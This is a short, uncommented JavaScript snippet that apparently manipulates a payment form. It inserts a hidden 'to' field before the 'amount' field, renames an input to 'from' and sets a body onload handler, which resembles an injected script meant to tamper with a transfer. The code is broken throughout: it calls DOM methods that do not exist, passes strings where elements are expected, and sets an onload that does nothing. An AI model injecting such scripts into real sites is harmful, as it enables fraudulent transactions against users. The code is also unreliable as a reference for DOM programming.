var form1 = document.getElementByTagName("form")[0]; 
var thing1 = document.createElement("input"); 
var thing2 = document.getElementByName("amount"); 
thing1.setAttribute("type", "hidden");  
thing1.setAttribute("name", "to"); 
form1.appendChild("thing1").insertBefore("thing2"); 
document.getElementByTag("input")[0].setAttribute("name", "from"); 
document.getElementByTagName("body")[0].setAttribute("onload", "document.getElementsByTagName('form')[0]");
